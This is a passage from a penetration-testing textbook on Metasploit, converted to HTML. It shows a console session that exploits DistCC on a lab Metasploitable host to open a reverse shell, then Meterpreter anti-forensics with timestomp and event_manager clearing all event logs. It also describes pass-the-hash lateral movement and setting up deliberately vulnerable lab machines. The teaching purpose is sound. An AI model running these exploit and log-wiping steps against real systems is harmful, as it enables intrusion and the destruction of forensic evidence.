7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Notice that we cannot write to the root folder, because we’re running from a limited user account and this folder requires root-level permissions. Usually, Apache runs under the Apache user account, which is sometimes <span class="s19">apache </span>but which can also be <span class="s19">httpd</span>, <span class="s19">www-data</span>, among other names. Based on what we know about the operating system version in use on the target, we could use local privilege escalation techniques to gain further access as root. Because we already have some basic access, let’s try a couple of different attacks.</p><p class="s22" style="padding-top: 8pt;padding-left: 90pt;text-indent: -36pt;text-align: left;">NOTE <a href="http://www.exploit-db.com/exploits/5720/" class="s20" target="_blank">Here’s a little hint in obtaining root access to Metasploitable, without privilege escalation: Check out </a><span class="p">http://www.exploit-db.com/exploits/5720/ </span><span class="s19">for the SSH predictable PRNG exploit.</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark458">Attacking Obscure Services</a><a name="bookmark472">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">When we performed only the default <span class="s19">nmap </span>port scan, we did not include all possible ports. Because we have now gained initial access to the system, we enter <span class="s24">netstat -antp</span>, and we notice other ports that <span class="s19">nmap </span>did not scan for</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">when performing the attack. (Remember that in a penetration test we can’t always rely on the defaults to be successful.)</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Our scan finds that port 3632 is open and associated with <span class="s19">DistCC</span>. An online search tells us that <span class="s19">DistCC </span>is a program that distributes builds of C/C++ code to several machines across a network, and it is vulnerable to an attack. (When performing penetration tests, you will often encounter unfamiliar applications and products, and you will need to research the application before you can attack it.)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_709.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(distcc_exec) &gt; <span class="s24">set payload linux/x86/shell_reverse_tcp</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">payload =&gt; linux/x86/shell_reverse_tcp</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(distcc_exec) &gt; <span class="s24">set LHOST 172.16.32.129</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">LHOST =&gt; 172.16.32.129</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">shomsf exploit(distcc_exec) &gt; <span class="s24">set RHOST 172.16.32.162</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">RHOST =&gt; 172.16.32.162</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(distcc_exec) &gt; <span class="s24">show payloads</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Compatible Payloads</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">===================</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:46.7196pt" cellspacing="0"><tr style="height:10pt"><td style="width:96pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Name</p></td><td style="width:34pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Rank</p></td><td style="width:206pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Description</p></td></tr><tr style="height:11pt"><td style="width:96pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">----</p></td><td style="width:34pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">----</p></td><td style="width:206pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">-----------</p></td></tr><tr style="height:11pt"><td style="width:96pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">cmd/unix/bind_perl</p></td><td style="width:34pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">normal</p></td><td style="width:206pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Unix Command Shell, Bind TCP (via perl)</p></td></tr><tr style="height:11pt"><td style="width:96pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">cmd/unix/bind_ruby</p></td><td style="width:34pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">normal</p></td><td style="width:206pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Unix Command Shell, Bind TCP (via Ruby)</p></td></tr><tr style="height:11pt"><td style="width:96pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">cmd/unix/generic</p></td><td style="width:34pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">normal</p></td><td style="width:206pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Unix Command, Generic command execution</p></td></tr><tr style="height:11pt"><td style="width:96pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">cmd/unix/reverse</p></td><td style="width:34pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">normal</p></td><td style="width:206pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Unix Command Shell, Double reverse TCP (telnet)</p></td></tr><tr style="height:11pt"><td style="width:96pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">cmd/unix/reverse_perl</p></td><td style="width:34pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">normal</p></td><td style="width:206pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Unix Command Shell, Reverse TCP (via perl)</p></td></tr><tr style="height:10pt"><td style="width:96pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">cmd/unix/reverse_ruby</p></td><td style="width:34pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">normal</p></td><td style="width:206pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Unix Command Shell, Reverse TCP (via Ruby)</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(distcc_exec) &gt; <span class="s24">set payload cmd/unix/reverse</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">payload =&gt; cmd/unix/reverse</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(distcc_exec) &gt; <span class="s24">exploit</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Started reverse double handler</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Accepted the first client connection... [*] Accepted the second client connection... [*] Command: echo q6Td9oaTrOkXsBXS;</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Writing to socket A [*] Writing to socket B</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Reading from sockets... [*] Reading from socket A</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] A: &quot;q6Td9oaTrOkXsBXS\r\n&quot; [*] Matching...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] B is input...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Command shell session 2 opened (172.16.32.129:4444 -&gt; 172.16.32.162:47002) at 2010-05-</p><p class="s25" style="padding-left: 53pt;text-indent: 0pt;line-height: 10pt;text-align: left;">22 00:08:04 -0400</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">whoami</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">daemon</p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">mkdir /root/moo</p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">mkdir: cannot create directory &#39;/root/moo&#39;: Permission denied</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_710.png"/></span></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;"><a href="http://www.exploit-db.com/)" class="s31" target="_blank">Notice above that we are still not at root. A local privilege exploit will further compromise the system and give full root access. We won’t tell you the answer here; use what you’ve learned in this book to gain root privileges successfully on the Metasploitable system. One hint is that you can find the exploit at Exploits Database (</a><a href="http://www.exploit-db.com/)" class="s20" target="_blank">http://www.exploit-db.com</a>/). Try getting a root Linux/Meterpreter shell on the system on your own.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark459">Covering Your Tracks</a><a name="bookmark473">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Having completed our attacks, our next step is to return to each exploited system to erase our tracks and clean up any mess we’ve left behind. Remnants of a Meterpreter shell or some other pieces of malware should be removed to avoid exposing the system further. For example, when we used the <span class="s25">PUT </span>com- mand to compromise the Apache Tomcat instance, an attacker could use the exploit code left behind to compromise the system.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Sometimes, you will need to cover your tracks—for example, when test- ing the forensics analysis of a compromised system or an incident response program. In such cases, your goal is to thwart any forensics analysis or IDS. It’s often difficult to hide all your tracks, but you should be able to manipu- late the system to confuse the examiner and make it almost impossible to identify the extent of the attack.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">In most cases, when forensics analysis is performed, if you can mangle the system so that it renders the majority of the examiner’s work almost unreadable and inconclusive, he will most likely identify the system as having been infected or compromised and might not understand how much infor- mation you were able to extract from the system. The best way to thwart forensic analysis is to wipe the system completely and rebuild it, removing all traces, but this is rare during a penetration test.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">One benefit discussed in a number of chapters is the ability for Meter- preter to reside purely in memory. Often, you’ll find it challenging to detect and react to Meterpreter in memory space. Although research often suggests ways to detect a Meterpreter payload, the Metasploit crew typically responds with a new way to hide Meterpreter.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">This is the same cat-and-mouse game that antivirus software vendors play with new releases of Meterpreter. When a new encoder or method for obfus- cating a payload is released, vendors can take several months to detect the issues and update their product signatures to catch them. In most cases, it’s relatively difficult for most forensics analysts to identify a purely memory- resident attack vector from Metasploit.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">We won’t offer in-depth information about covering your tracks, but a cou- ple of Metasploit features are worth mentioning: <span class="s19">timestomp </span>and <span class="s19">event_manager</span>. <span class="s19">Timestomp </span>is a Meterpreter plug-in that allows you to modify, erase, or set cer- tain attributes on files. Let’s run <span class="s19">timestomp </span>first:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_711.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">meterpreter &gt; <span class="s24">timestomp</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Usage: timestomp file_path OPTIONS</p><p class="s25" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">OPTIONS:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 107pt;text-indent: 0pt;line-height: 11pt;text-align: left;">-a &lt;opt&gt; Set the &quot;last accessed&quot; time of the file</p><p class="s25" style="padding-left: 107pt;text-indent: 0pt;line-height: 11pt;text-align: left;">-b Set the MACE timestamps so that EnCase shows blanks</p><p class="s25" style="padding-left: 107pt;text-indent: 0pt;line-height: 11pt;text-align: left;">-c &lt;opt&gt; Set the &quot;creation&quot; time of the file</p><p class="s25" style="padding-left: 107pt;text-indent: 0pt;line-height: 11pt;text-align: left;">-e &lt;opt&gt; Set the &quot;mft entry modified&quot; time of the file</p><p class="s25" style="padding-left: 107pt;text-indent: 0pt;line-height: 11pt;text-align: left;">-f &lt;opt&gt; Set the MACE of attributes equal to the supplied file</p><p class="s25" style="padding-left: 107pt;text-indent: 0pt;line-height: 11pt;text-align: left;">-h Help banner</p><p class="s25" style="padding-left: 107pt;text-indent: 0pt;line-height: 11pt;text-align: left;">-m &lt;opt&gt; Set the &quot;last written&quot; time of the file</p><p class="s25" style="padding-left: 107pt;text-indent: 0pt;line-height: 11pt;text-align: left;">-r Set the MACE timestamps recursively on a directory</p><p class="s25" style="padding-left: 107pt;text-indent: 0pt;line-height: 11pt;text-align: left;">-v Display the UTC MACE values of the file</p><p class="s25" style="padding-left: 107pt;text-indent: 0pt;line-height: 11pt;text-align: left;">-z &lt;opt&gt; Set all four attributes (MACE) of the file</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span class="s24">timestomp C:\\boot.ini -b</span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Blanking file MACE attributes on C:\boot.ini meterpreter &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_712.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">In this example, we changed the timestamp so that when Encase (a popular forensics analysis tool) is used, the timestamps are blank.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">The tool <span class="s19">event_manager </span>will modify event logs so that they don’t show any information that might reveal that an attack occurred. Here it is in action:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_713.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span class="s24">run event_manager</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 193%;text-align: left;">Meterpreter Script for Windows Event Log Query and Clear. OPTIONS:</p><p class="s25" style="padding-left: 53pt;text-indent: 0pt;line-height: 11pt;text-align: left;">-c &lt;opt&gt; Clear a given Event Log (or ALL if no argument specified)</p><p class="s25" style="padding-left: 53pt;text-indent: 0pt;line-height: 11pt;text-align: left;">-f &lt;opt&gt; Event ID to filter events on</p><p class="s25" style="padding-left: 53pt;text-indent: 0pt;line-height: 11pt;text-align: left;">-h Help menu</p><p class="s25" style="padding-left: 53pt;text-indent: 0pt;line-height: 11pt;text-align: left;">-i Show information about Event Logs on the System and their configuration</p><p class="s25" style="padding-left: 53pt;text-indent: 0pt;line-height: 11pt;text-align: left;">-l &lt;opt&gt; List a given Event Log.</p><p class="s25" style="padding-left: 53pt;text-indent: 0pt;line-height: 11pt;text-align: left;">-p Supress printing filtered logs to screen</p><p class="s25" style="padding-left: 95pt;text-indent: -42pt;line-height: 88%;text-align: left;">-s &lt;opt&gt; Save logs to local CSV file, optionally specify alternate folder in which to save logs</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span class="s24">run event_manager -c</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[-] You must specify an eventlog to query! [*] Application:</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Clearing Application</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Event Log Application Cleared! [*] MailCarrier 2.0:</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Clearing MailCarrier 2.0</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Event Log MailCarrier 2.0 Cleared! [*] Security:</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Clearing Security</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Event Log Security Cleared! [*] System:</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Clearing System</p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Event Log System Cleared! meterpreter &gt;</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_714.png"/></span></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">In this example, we clear all the event logs, but the examiner might notice other interesting things on the system that could alert him to an attack. In general though, the examiner will not be able to piece together the puzzle to identify what happened during the attack, but he will know that something bad had occurred.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Remember to document your changes to a target system to make it easier to cover your tracks. Usually, you’ll leave a small sliver of information on the system, so you might as well make it extremely difficult for the incident response and forensics analysis team to find it.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark460">Wrapping Up</a><a name="bookmark474">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Having gotten this far, we could continue to attack other machines on the internal network using Metasploit and Meterpreter, with our attacks limited only by our creativity and ability. If this were a larger network, we could fur- ther penetrate the network using information gathered from various systems on the network.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">For example, earlier in this chapter we compromised a Windows-based system. We could use the Meterpreter console to extract the hash values from that system and then use those credentials to authenticate to other Windows- based systems. The local administrator account is almost always the same from one system to another, so even in a corporate environment, we could use the information from one system to bridge attacks to another.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Penetration testing requires you to think outside the box and combine pieces of a puzzle. We used one method during this chapter, but there are probably several different ways to get into the systems and different avenues of attack you can leverage. This all comes with experience and spending the time to become creative. Persistence is key to penetration testing.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Remember to establish a fundamental set of methodologies you are com- fortable with, but change them as necessary. Often, penetration testers change their methodologies at least once per test to stay fresh. Changes might include a new way of attacking a system or use of a new method. Regardless of the method you choose, remember that you can accomplish anything in this field with a bit of experience and hard work.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 226pt;text-indent: 0pt;text-align: left;"><span><img width="82" height="121" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_715.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s11" style="padding-top: 9pt;padding-left: 158pt;text-indent: -7pt;line-height: 87%;text-align: left;"><a name="bookmark475">CONFIGURING YOUR TARGET MACHINES </a><a name="bookmark483">&zwnj;</a><a name="bookmark484">&zwnj;</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s17" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">The best way to learn to use the Metasploit Framework is by practicing—repeating a task until you fully under- stand how it is accomplished. This appendix explains how to set up a test environment to use with the exam- ples in this book.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark476">Installing and Setting Up the System</a><a name="bookmark485">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">The examples in this book use a combination of Back|Track, Ubuntu 9.04, Metasploitable, and Windows XP. Back|Track serves as our vehicle for exploi- tation, and the Ubuntu and Windows systems are our target systems.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">First create an unpatched Windows XP Service Pack 2 installation to test the examples presented throughout this book. The Back|Track and Ubuntu 9.04 virtual machines can be run on a host machine running Windows, Mac OS X, or Linux on any VMware product, including Workstation, Server, Player, Fusion, or ESX.</p><p class="s22" style="padding-top: 4pt;padding-left: 90pt;text-indent: -36pt;text-align: left;">NOTE <span class="s19">Be careful with your Ubuntu and Windows XP virtual machines, because these systems are vulnerable and easy to exploit. Do not conduct any sensitive activities on these machines: If you can exploit them, anyone else can, too.</span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">If you don’t already have the free VMware Player for Windows and Linux, download and install it. If you’re using OS X, download the free 30-day trial of VMware Fusion. (If you’re running Windows, you can also use the free VMware Server edition.)</p><p style="padding-left: 90pt;text-indent: 17pt;text-align: left;">After you have installed VMware, double-click the <span class="s19">.vmx </span>file to use with VMware, or open the virtual machine files in VMware Player by choosing <span class="s18">File</span><span class="s49">►</span><span class="s18">Open </span>and pointing to the folder that contains all the virtual machines and associated files. If you’re installing from an ISO disc image, create a new virtual machine and specify this ISO file as the CD-ROM device.</p><p class="s22" style="padding-top: 9pt;padding-left: 90pt;text-indent: -36pt;text-align: left;">NOTE <a href="http://www.backtrack-linux.org/" class="s20" target="_blank">Download Back|Track from </a><a href="http://www.backtrack-linux.org/" class="s31" target="_blank">http://www.backtrack-linux.org</a><a href="http://www.vmware.com/appliances/directory/" class="s20" target="_blank">/ and Ubuntu 9.04 from </a><a href="http://www.vmware.com/appliances/directory/" class="s31" target="_blank">http://www.vmware.com/appliances/directory</a><span class="s19">/ by searching for Ubuntu</span></p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a href="http://blog.metasploit.com/2010/" class="s20" target="_blank">9.04. Metasploitable can be downloaded from </a>http://blog.metasploit.com/2010/ 05/introducing-metasploitable.html<span class="s19">.</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark477">Booting Up the Linux Virtual Machines</a><a name="bookmark486">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">After powering on either of the Linux virtual machines, you need to log in. The default credentials for both Linux environments are username <span class="s19">root </span>and password <span class="s19">toor</span>.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;"><a href="http://www.yolinux.com/TUTORIALS/LinuxTutorialNetworking.html.)" class="s31" target="_blank">If you don’t have a DHCP server on your network, find your system’s address range and use the commands shown in the following listing. (Make sure that you replace your IP address with an unused one, and edit the net- work interface that you will be using. For more on manual network setup, see </a><a href="http://www.yolinux.com/TUTORIALS/LinuxTutorialNetworking.html.)" class="s20" target="_blank">http://www.yolinux.com/TUTORIALS/LinuxTutorialNetworking.html</a><a href="http://www.yolinux.com/TUTORIALS/LinuxTutorialNetworking.html.)" class="s31" target="_blank">.)</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_716.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: justify;">root@bt:~# <span class="s24">nano /etc/network/interfaces</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Password:</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">&lt;inside the nano editor place your valid information into the system&gt; # The primary network interface</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">auto eth0 # the interface used</p><p class="s25" style="padding-left: 115pt;text-indent: -25pt;text-align: left;">iface eth0 inet static # configure static IP address address 192.168.1.10 # your IP address you want netmask 255.255.255.0 # your subnet mask network 192.168.1.0 # your network address</p><p class="s25" style="padding-left: 115pt;text-indent: 0pt;text-align: left;">broadcast 192.168.0.255 # your broadcast address gateway 192.168.1.1 # your default gateway</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;control-x&gt;</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&lt;y&gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_717.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">After configuration is complete, your Linux environment should be ready for use. Do not update the Ubuntu installation, because this system should remain vulnerable.</p><p class="s4" style="padding-top: 5pt;padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark478">Setting Up a Vulnerable Windows XP Installation</a><a name="bookmark487">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">To run the examples in this book, you will need to install a licensed copy of Windows XP on a virtualization platform such as VMware. After you have completed the installation, log in as Administrator, open the Control Panel, switch to Classic View, and choose <span class="s18">Windows Firewall</span>. Select <span class="s18">Off </span>and click <span class="s18">OK</span>. (This may seem unrealistic, but this scenario is more common than you might imagine in large corporations.)</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Next, open Automatic Updates and select <span class="s18">Turn off Automatic Updates</span>; then click <span class="s18">OK</span>. You don’t want Windows to patch vulnerabilities as you’re trying to learn how to exploit them.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">Now configure your installation with a static IP address via the Network Connections Control Panel. While not required, doing this will save you from having to recheck the target address every time you launch an exploit.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark479">Configuring Your Web Server on Windows XP</a><a name="bookmark488">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">To make things interesting and provide for a larger attack surface, we’ll enable some additional services.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><ol id="l40"><li><p style="padding-left: 108pt;text-indent: -18pt;text-align: left;">In the Control Panel, select <span class="s18">Add or Remove Programs</span>, and then select <span class="s18">Add/Remove Windows Components</span>. You should be looking at the <span class="s19">Windows Components Wizard</span>.</p></li><li><p style="padding-top: 2pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Select the checkbox for <span class="s18">Internet Information Services (IIS) </span>and click <span class="s18">Details</span>. Then select the checkbox for <span class="s18">File Transfer Protocol (FTP) Service </span>and click <span class="s18">OK</span>. Conveniently enough, the FTP service allows anonymous connections by default.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Select the <span class="s18">Management and Monitoring Tools </span>checkbox and click <span class="s18">OK</span>. By default, this installs the Simple Network Management Protocol (SNMP) and Windows Management Interface (WMI) SNMP Provider.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Click <span class="s18">Next </span>to complete the installation and reboot the machine for good measure.</p></li></ol><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;"><a href="http://www.secmaniac.com/files/nostarch1.zip" class="s31" target="_blank">The combination of these steps adds different services that we test through- out this book. The IIS server will allow you to run a website and can be down- loaded from </a><a href="http://www.secmaniac.com/files/nostarch1.zip" class="s20" target="_blank">http://www.secmaniac.com/files/nostarch1.zip</a>. The FTP service will allow you to perform FTP-based attacks against the Windows system, and the SNMP configuration will allow you to test auxiliary modules within Metasploit.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark480">Building a SQL Server</a><a name="bookmark489">&zwnj;</a></p><p class="s19" style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;"><a href="http://www.microsoft.com/" class="s31" target="_blank">Many database modules within Metasploit and Fast-Track target Microsoft SQL Server, so you need to install SQL Server 2005 Express, available for free from Microsoft. As of this writing, you can locate the non–service pack version of SQL Server Express at </a>http://www.microsoft.com/. <a href="http://www.secmaniac.com/files/nostarch1.zip" class="s31" target="_blank">To install SQL Server Express, you will need to install Windows Installer 3.1 and the .NET Frame- work 2.0. You can find links to the resources on this page, and all other URLs referenced in this book, at </a><a href="http://www.secmaniac.com/files/nostarch1.zip" class="s20" target="_blank">http://www.secmaniac.com/files/nostarch1.zip.</a></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: justify;">Once you have the prerequisites installed, run the SQL Express installer and select all the defaults except for Authentication Mode. Select <span class="s18">Mixed Mode</span>, set a <span class="s19">sa </span>login password of <span class="s19">password1</span>, and then continue with the installation.</p><p style="padding-left: 